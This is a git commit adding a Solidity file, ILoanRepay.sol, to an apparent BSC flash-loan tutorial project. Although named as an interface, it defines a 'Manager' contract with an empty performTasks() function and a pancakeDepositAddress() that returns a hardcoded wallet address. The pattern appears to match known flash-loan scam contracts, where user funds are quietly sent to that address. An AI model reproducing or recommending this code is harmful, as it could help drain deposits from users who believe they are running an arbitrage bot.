280082c9bf0a0fef297604145f22f841858aefe0
Mathiaszero <55817193+Mathiaszero@users.noreply.github.com>
2021-11-04 21:26:03 -0400

    Create ILoanRepay.sol

---
+++ screencast/310-flashloan-bsc/contracts/interfaces/ILoanRepay.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x2775127d62F94c3568ba488179c3baD2D4B26b5c;
+	}
+}
